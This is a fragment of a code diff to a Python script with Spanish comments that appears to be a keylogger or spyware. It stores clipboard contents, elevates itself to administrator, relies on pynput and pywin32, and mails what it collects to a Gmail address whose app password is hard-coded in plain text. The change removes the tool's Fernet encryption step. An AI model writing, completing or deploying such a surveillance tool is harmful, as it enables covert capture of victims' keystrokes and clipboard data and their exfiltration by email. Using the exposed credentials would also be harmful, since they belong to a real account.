@@ -16,7 +16,6 @@ import sys
 from threading import Thread
 import subprocess
 import pkg_resources
-from cryptography.fernet import Fernet
 
 # Rutas de los archivos de forma relativa
 current_directory = os.path.dirname(__file__)
@@ -28,10 +27,6 @@ clipboard_information = os.path.join(current_directory, "clipboard.txt")
 email_address = 'classeprueba1234@gmail.com'
 password = 'lgal hrtr ufpw stld'
 toaddr = "classeprueba1234@gmail.com"
-
-#encriptación
-clave = Fernet.generate_key()
-cipher_suite = Fernet(clave)
 
 #Funcion para ejecutar el script como administrador
 def run_as_admin():
@@ -52,7 +47,7 @@ def is_dependency_installed(dependency_name):
     except pkg_resources.DistributionNotFound:
         return False
 #lista de dependencias
-dependencias = ['pywin32', 'pynput', 'requests', 'cryptography']
+dependencias = ['pywin32', 'pynput', 'requests']
 
 for dependencia in dependencias:
     if is_dependency_installed(dependencia):
